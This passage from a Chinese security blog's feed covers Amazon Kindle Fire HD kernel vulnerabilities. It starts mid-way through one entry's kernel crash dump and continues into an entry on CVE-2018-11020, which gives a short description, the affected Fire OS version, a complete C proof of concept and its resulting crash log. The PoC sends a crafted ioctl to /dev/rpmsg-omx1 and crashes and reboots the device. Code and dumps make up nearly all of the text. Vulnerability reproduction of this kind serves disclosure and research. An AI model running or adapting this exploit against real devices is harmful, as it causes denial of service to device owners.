dd150400</span><br><span class="line">[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda</span><br><span class="line">[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24</span><br><span class="line">[  165.612121] Process gcioctl_poc (pid: 3932, stack limit &#x3D; 0xc25a02f8)</span><br><span class="line">[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)</span><br><span class="line">[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0</span><br><span class="line">[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8</span><br><span class="line">[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14</span><br><span class="line">[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000</span><br><span class="line">[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08</span><br><span class="line">[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004</span><br><span class="line">[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004</span><br><span class="line">[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8</span><br><span class="line">[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610</span><br><span class="line">[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624</span><br><span class="line">[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[  165.743835] Backtrace: </span><br><span class="line">[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638</span><br><span class="line">[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) </span><br><span class="line">[  165.793060] Board Information: </span><br><span class="line">[  165.793060]  Revision : 0001</span><br><span class="line">[  165.793060]  Serial	: 0000000000000000</span><br><span class="line">[  165.793090] SoC Information:</span><br><span class="line">[  165.793090]  CPU	: OMAP4470</span><br><span class="line">[  165.793090]  Rev	: ES1.0</span><br><span class="line">[  165.793121]  Type	: HS</span><br><span class="line">[  165.793121]  Production ID: 0002B975-000000CC</span><br><span class="line">[  165.793121]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  165.793121] </span><br><span class="line">[  165.844757] ---[ end trace aba846a2af6e75b7 ]---</span><br><span class="line">[  165.850097] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  165.856109] CPU0: stopping</span><br><span class="line">[  165.859252] Backtrace: </span><br><span class="line">[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950</span><br><span class="line">[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)</span><br><span class="line">[  165.912384] fc20:                                                       c153a9f8 00000000</span><br><span class="line">[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f</span><br><span class="line">[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff</span><br><span class="line">[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4</span><br><span class="line">[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0&#x2F;0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c&#x2F;0x3f0)</span><br><span class="line">[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0&#x2F;0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50&#x2F;0x58)</span><br><span class="line">[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0&#x2F;0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64&#x2F;0x7c)</span><br><span class="line">[  165.977233]  r4:d8caee3c</span><br><span class="line">[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0&#x2F;0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc&#x2F;0x238)</span><br><span class="line">[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0&#x2F;0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38&#x2F;0x68)</span><br><span class="line">[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000</span><br><span class="line">[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0&#x2F;0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4&#x2F;0x69c)</span><br><span class="line">[  166.017761]  r4:dd243c00</span><br><span class="line">[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0&#x2F;0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84&#x2F;0x9c)</span><br><span class="line">[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0&#x2F;0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0&#x2F;0xf0)</span><br><span class="line">[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000</span><br><span class="line">[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0&#x2F;0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4&#x2F;0x148)</span><br><span class="line">[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0&#x2F;0x148) from [&lt;c01259d8&gt;] (sys_read+0x40&#x2F;0x78)</span><br><span class="line">[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000</span><br><span class="line">[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0&#x2F;0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010</span><br><span class="line">[  166.091217] CPU0 PC (0) : 0xc0019b2c</span><br><span class="line">[  166.095397] CPU0 PC (1) : 0xc0019b2c</span><br><span class="line">[  166.099456] CPU0 PC (2) : 0xc0019b2c</span><br><span class="line">[  166.103515] CPU0 PC (3) : 0xc0019b2c</span><br><span class="line">[  166.107574] CPU0 PC (4) : 0xc0019b2c</span><br><span class="line">[  166.111785] CPU0 PC (5) : 0xc0019b2c</span><br><span class="line">[  166.115814] CPU0 PC (6) : 0xc0019b2c</span><br><span class="line">[  166.119873] CPU0 PC (7) : 0xc0019b2c</span><br><span class="line">[  166.124084] CPU0 PC (8) : 0xc0019b2c</span><br><span class="line">[  166.128112] CPU0 PC (9) : 0xc0019b2c</span><br><span class="line">[  166.132171] CPU1 PC (0) : 0xc003ee38</span><br><span class="line">[  166.136352] CPU1 PC (1) : 0xc003ee54</span><br><span class="line">[  166.140411] CPU1 PC (2) : 0xc003ee54</span><br><span class="line">[  166.144470] CPU1 PC (3) : 0xc003ee54</span><br><span class="line">[  166.148681] CPU1 PC (4) : 0xc003ee54</span><br><span class="line">[  166.152709] CPU1 PC (5) : 0xc003ee54</span><br><span class="line">[  166.156768] CPU1 PC (6) : 0xc003ee54</span><br><span class="line">[  166.160980] CPU1 PC (7) : 0xc003ee54</span><br><span class="line">[  166.165008] CPU1 PC (8) : 0xc003ee54</span><br><span class="line">[  166.169067] CPU1 PC (9) : 0xc003ee54</span><br><span class="line">[  166.173126] </span><br><span class="line">[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  166.175079] </span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11020%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/rpmsg/rpmsg_omx.c允许攻击者通过设备文件/ dev / rpmsg-上的ioctl的参数注入特制的参数使用命令<strong>3221772291的omx1</strong>，并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / rpmsg-omx1，并使用命令<strong>3221772291</strong>和精心设计的有效负载作为第三个参数来对该设备文件进行ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is gcicommit.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/rpmsg-omx1&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3221772291</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123; <span class="number">0xb5d18de2</span>, <span class="number">0xf6e48a17</span>, <span class="number">0x9179c429</span>, <span class="number">0x89a32e03</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  146.290710] Unable to handle kernel paging request at virtual address b5d18de6</span><br><span class="line">[  146.299438] pgd &#x3D; d72dc000</span><br><span class="line">[  146.302795] [b5d18de6] *pgd&#x3D;00000000</span><br><span class="line">[  146.307281] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  146.313232] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  146.320983] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  146.328308] PC is at ion_free+0xc&#x2F;0xb4</span><br><span class="line">[  146.332672] LR is at rpmsg_omx_ioctl+0x2cc&#x2F;0x598</span><br><span class="line">[  146.337890] pc : [&lt;c02e8540&gt;]    lr : [&lt;c048a120&gt;]    psr: 60000013</span><br><span class="line">[  146.337890] sp : c35b5e60  ip : c35b5e80  fp : c35b5e7c</span><br><span class="line">[  146.350860] r10: c35b5ea8  r9 : de88c4d8  r8 : c35b4000</span><br><span class="line">[  146.356872] r7 : dd32b580  r6 : 00000003  r5 : d71d5880  r4 : be92f5f8</span><br><span class="line">[  146.364135] r3 : d71d58ec  r2 : d71d58ec  r1 : b5d18de2  r0 : d7aaaa00</span><br><span class="line">[  146.371551] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  146.379516] Control: 10c5387d  Table: 972dc04a  DAC: 00000015</span><br><span class="line">[  146.386077] </span><br><span class="line">[  146.386077] PC: 0xc02e84c0:</span><br><span class="line">[  146.391052] 84c0  0a000001 e2871010 ebfddc25 e1a00006 eb0ee904 e5953058 e2433001 e5853058</span><br><span class="line">[  146.401580] 84e0  e3530000 ba000011 1a000009 e1a0200d e3c23d7f e3c3303f e285005c e593300c</span><br><span class="line">[  146.412292] 8500  e593723c e1a01007 ebf90a76 e597321c e585306c e1a00006 eb0ee876 e1a00005</span><br><span class="line">[  146.422821] 8520  ebffffb4 e1a00004 ebf8e011 e89da8f0 e7f001f2 e1a0c00d e92dd878 e24cb004</span><br><span class="line">[  146.433502] 8540  e5915004 e1a04001 e1550000 1a000021 e2856014 e1a00006 eb0ee8e2 e5953010</span><br><span class="line">[  146.444183] 8560  e3530000 0a000005 e243200c e1540002 2a00000a e5933008 e3530000 1afffff9</span><br><span class="line">[  146.454864] 8580  e59f0054 e3001219 e59f2050 e59f3050 ebf58268 e1a00006 eb0ee856 e89da878</span><br><span class="line">[  146.465393] 85a0  85933004 8affffed f57ff05f e1943f9f e2433001 e1842f93 e3320000 1afffffa</span><br><span class="line">[  146.476074] </span><br><span class="line">[  146.476074] LR: 0xc048a0a0:</span><br><span class="line">[  146.481048] a0a0  33a03000 e3530000 1affffae e24ba05c e1a01004 e3a02008 e1a0000a ebf7305e</span><br><span class="line">[  146.491729] a0c0  e3500000 1affffaa e5950068 e51b1058 ebf97677 e3500000 e50b005c 0a000001</span><br><span class="line">[  146.502380] a0e0  e3700a01 9affffc8 e3a03000 e50b305c eaffffc5 e3e00018 eaffff8e e1a00004</span><br><span class="line">[  146.513061] a100  e1a0100a e3a02008 ebf73154 e3500000 0affff88 eaffffc2 e5950068 ebf97904</span><br><span class="line">[  146.523590] a120  eaffffb9 e24b005c e3a01030 ebf7398b e3a02030 e597003c e1a03006 e58d2000</span><br><span class="line">[  146.534240] a140  e59f1280 e59f2274 ebf99069 e3e0000d eaffff78 e5933004 e7933101 e3530000</span><br><span class="line">[  146.544921] a160  0affff6c e5950068 ebf97651 e2509000 0a000021 e3790a01 8a00001f e5950068</span><br><span class="line">[  146.555603] a180  e1a01009 e24b2064 e24b3060 ebf97447 e3500000 050b905c 0affff9b e59f322c</span><br><span class="line">[  146.566131] </span><br><span class="line">[  146.566131] SP: 0xc35b5de0:</span><br><span class="line">[  146.571228] 5de0  00000004 d8cc50f4 60010013 00000001 00000001 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.581787] 5e00  c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2</span><br><span class="line">[  146.592437] 5e20  d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8</span><br><span class="line">[  146.603118] 5e40  c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.613830] 5e60  d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  146.624389] 5e80  c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  146.635070] 5ea0  c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  146.645599] 5ec0  00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  146.656158] </span><br><span class="line">[  146.656158] IP: 0xc35b5e00:</span><br><span class="line">[  146.661254] 5e00  c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2</span><br><span class="line">[  146.671936] 5e20  d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8</span><br><span class="line">[  146.682495] 5e40  c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.693176] 5e60  d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  146.703704] 5e80  c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  146.714263] 5ea0  c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  146.724914] 5ec0  00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  146.735595] 5ee0  d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08</span><br><span class="line">[  146.746276] </span><br><span class="line">[  146.746276] FP: 0xc35b5dfc:</span><br><span class="line">[  146.751251] 5dfc  ffffffff c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00</span><br><span class="line">[  146.761779] 5e1c  b5d18de2 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000</span><br><span class="line">[  146.772308] 5e3c  de88c4d8 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013</span><br><span class="line">[  146.783020] 5e5c  ffffffff d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120</span><br><span class="line">[  146.793701] 5e7c  c02e8540 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4</span><br><span class="line">[  146.804382] 5e9c  c35b5ea8 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000</span><br><span class="line">[  146.814941] 5ebc  c35b5f14 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc</span><br><span class="line">[  146.825592] 5edc  00000000 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74</span><br><span class="line">[  146.836242] </span><br><span class="line">[  146.836242] R0: 0xd7aaa980:</span><br><span class="line">[  146.841217] a980  00000001 00000001 00000000 00000000 00004007 00000000 00000000 00000000</span><br><span class="line">[  146.851898] a9a0  00000020 00000000 00000000 00000000 00000300 d7aaa9b4 d7aaa9b4 c0248d00</span><br><span class="line">[  146.862518] a9c0  00000093 00000093 0000005d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.873077] a9e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.883728] aa00  d763b780 00000000 00000000 deabb480 00000000 00000001 00000000 00000000</span><br><span class="line">[  146.894409] aa20  d7aaaa20 d7aaaa20 00000000 00000105 c0903054 d7157440 00000f30 dcd4f220</span><br><span class="line">[  146.905090] aa40  00000093 00000003 00000017 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.915618] aa60  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.926300] </span><br><span class="line">[  146.926300] R2: 0xd71d586c:</span><br><span class="line">[  146.931274] 586c  00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580</span><br><span class="line">[  146.941955] 588c  d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000</span><br><span class="line">[  146.952636] 58ac  d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000</span><br><span class="line">[  146.963287] 58cc  00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00</span><br><span class="line">[  146.973815] 58ec  d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904</span><br><span class="line">[  146.984497] 590c  00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000</span><br><span class="line">[  146.995147] 592c  00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000</span><br><span class="line">[  147.005676] 594c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.016357] </span><br><span class="line">[  147.016357] R3: 0xd71d586c:</span><br><span class="line">[  147.021453] 586c  00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580</span><br><span class="line">[  147.032012] 588c  d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000</span><br><span class="line">[  147.042663] 58ac  d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000</span><br><span class="line">[  147.053314] 58cc  00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00</span><br><span class="line">[  147.063873] 58ec  d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904</span><br><span class="line">[  147.074523] 590c  00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000</span><br><span class="line">[  147.085205] 592c  00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000</span><br><span class="line">[  147.095886] 594c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.106414] </span><br><span class="line">[  147.106445] R5: 0xd71d5800:</span><br><span class="line">[  147.111541] 5800  d71d5d00 00000000 00000000 dcfc4200 f0000009 00000211 00000001 00000001</span><br><span class="line">[  147.122070] 5820  00000000 00001000 00001000 00000004 00000000 d71d5844 c01519dc d89b54c0</span><br><span class="line">[  147.132751] 5840  c01576ac c10dc870 00001000 00000000 c0a10230 c0a10dc0 d1a1dd58 c006f724</span><br><span class="line">[  147.143432] 5860  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.154083] 5880  dd32b5c8 dd32b5c8 dd32b580 d71d588c d71d588c 00000000 00000000 00000000</span><br><span class="line">[  147.164611] 58a0  00000001 00000000 00000000 d71d58ac d71d58ac 00000000 00000000 00000000</span><br><span class="line">[  147.175140] 58c0  d71d58c0 d71d58c0 00000000 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0</span><br><span class="line">[  147.185821] 58e0  00000000 00000000 d7aaaa00 d71d58ec d71d58ec 00000000 00000000 00000000</span><br><span class="line">[  147.196472] </span><br><span class="line">[  147.196502] R7: 0xdd32b500:</span><br><span class="line">[  147.201446] b500  e2401000 f400f000 0202420f 0000c000 f400f000 dd071d20 00000000 d8f0a680</span><br><span class="line">[  147.212127] b520  d8f0a740 00000000 00000000 00000001 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.222656] b540  00000000 00000000 00000001 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.233184] b560  00000000 00000000 c153f430 00001000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.243865] b580  00000000 dd32b584 dd32b584 00000000 00000000 c0a16c60 00000000 00000002</span><br><span class="line">[  147.254547] b5a0  00000001 00000000 c06faab0 de88c61c de88c61c 0f700001 00000001 d8caa000</span><br><span class="line">[  147.265075] b5c0  dd0f7200 00000001 d71d5880 d71d5880 00000001 00000000 00000000 dd32b5dc</span><br><span class="line">[  147.275756] b5e0  dd32b5dc 00000000 7fffffff 00000000 00000000 dd32b5f4 dd32b5f4 00000000</span><br><span class="line">[  147.286407] </span><br><span class="line">[  147.286407] R8: 0xc35b3f80:</span><br><span class="line">[  147.291381] 3f80  66eff968 00000000 000000f0 c0013e08 c35b2000 00000000 00000000 c35b3fa8</span><br><span class="line">[  147.302032] 3fa0  c0013c60 c009a164 66eff978 66eff968 66eff978 00000080 00000000 00000000</span><br><span class="line">[  147.312713] 3fc0  66eff978 66eff968 00000000 000000f0 00000000 00000000 00000000 41d1f6a8</span><br><span class="line">[  147.323272] 3fe0  00000000 6716ebc8 400710f8 40083b80 600f0010 66eff978 00760061 00000061</span><br><span class="line">[  147.333923] 4000  00000000 00000002 00000000 d7157440 c0a0e840 00000000 00000015 d726ee00</span><br><span class="line">[  147.344604] 4020  d8d2c700 c35b4000 c09ddc50 d7157440 d8db57c0 c1617b40 c35b5b4c c35b5a98</span><br><span class="line">[  147.355133] 4040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  147.365814] 4060  0087d4c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.376464] </span><br><span class="line">[  147.376495] R9: 0xde88c458:</span><br><span class="line">[  147.381469] c458  de88c458 de88c458 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  147.392150] c478  00000000 00000000 de88c480 de88c480 00000000 de88c48c de88c48c 00000000</span><br><span class="line">[  147.402801] c498  5aefcde6 00000000 00000000 00000000 de88c4b0 28cfd730 00000000 00000000</span><br><span class="line">[  147.413330] c4b8  00200000 00000000 00000000 de88c4c4 de88c4c4 d8cbdf00 d8cbdf00 00000000</span><br><span class="line">[  147.424011] c4d8  000521b0 00000402 00000402 00000000 00000000 00000000 c06b9600 dd160400</span><br><span class="line">[  147.434661] c4f8  de88c5b0 d8c81030 00000f98 00000001 0f700001 5aefcde6 199c82ca 5aefcde6</span><br><span class="line">[  147.445312] c518  199c82ca 5aefcde6 199c82ca 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.455871] c538  00000000 00000000 00000000 00000000 00000001 00000000 00000000 de88c554</span><br><span class="line">[  147.466522] </span><br><span class="line">[  147.466522] R10: 0xc35b5e28:</span><br><span class="line">[  147.471588] 5e28  be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 c35b5ea8 c35b5e7c</span><br><span class="line">[  147.482269] 5e48  c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff d71d58ec be92f5f8</span><br><span class="line">[  147.492950] 5e68  d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 c35b5edc c35b5e90</span><br><span class="line">[  147.503631] 5e88  c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 c00723a0 000fffff</span><br><span class="line">[  147.514160] 5ea8  b5d18de2 f6e48a17 00000002 